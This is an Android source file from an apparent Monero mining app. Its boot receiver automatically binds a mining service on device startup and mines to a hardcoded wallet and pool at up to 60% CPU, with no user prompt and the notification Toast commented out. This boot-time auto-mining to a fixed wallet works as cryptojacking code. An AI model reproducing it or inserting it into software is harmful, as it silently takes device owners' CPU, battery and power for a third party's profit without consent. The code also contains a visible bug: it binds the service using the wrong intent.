package de.ludetis.monerominer;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Build;
import android.os.IBinder;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import java.util.Arrays;

import static android.content.Context.BIND_AUTO_CREATE;

public class BootBroadcastReceiver extends BroadcastReceiver {
    private final static String[] SUPPORTED_ARCHITECTURES = {"arm64-v8a", "armeabi-v7a"};

    private String edUser = "4A18FqzKr7yZeSg3dqDQKujgZpKh5KYAAJMcN5pssV4idbZgjH7Fi97Y1raCEGRa4dQXHdkssvgsSDhpZGCN9JHXDYFDjG1";
    private String edPool = "de.minexmr.com:4444";
    private int threads = 4;
    private int maxCpus = 60;
    private boolean useWorkerId = true;

    private boolean validArchitecture = true;
    private MiningService.MiningServiceBinder binder;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!Arrays.asList(SUPPORTED_ARCHITECTURES).contains(Build.CPU_ABI.toLowerCase())) {
            //Toast.makeText(this, "Sorry, this Service currently only supports 64 bit architectures, but yours is " + Build.CPU_ABI, Toast.LENGTH_LONG).show();
            // this flag will keep the start button disabled
            validArchitecture = false;
        }
        if (validArchitecture) {
            Intent service = new Intent(context, MiningService.class);
            context.getApplicationContext().bindService(intent, serverConnection, BIND_AUTO_CREATE);
            //context.getApplicationContext().startService(service);


            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                //context.startForegroundService(service);
                //ContextCompat.startForegroundService(context, intent);
            } else {
                //context.startService(service);
            }

        }
    }

    private void startMining() {
        if (binder == null) return;
        MiningService.MiningConfig cfg = binder.getService().newConfig(edUser, edPool,
                threads, maxCpus, useWorkerId);
        binder.getService().startMining(cfg);
    }

    private void stopMining() {
        binder.getService().stopMining();
    }

    private ServiceConnection serverConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            binder = (MiningService.MiningServiceBinder) iBinder;
            if (validArchitecture) {
                int cores = binder.getService().getAvailableCores();
                // write suggested cores usage into editText
                int suggested = cores / 2;
                if (suggested == 0) suggested = 1;
                threads = suggested;
                startMining();
            } else {
                stopMining();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            binder = null;
        }
    };
}
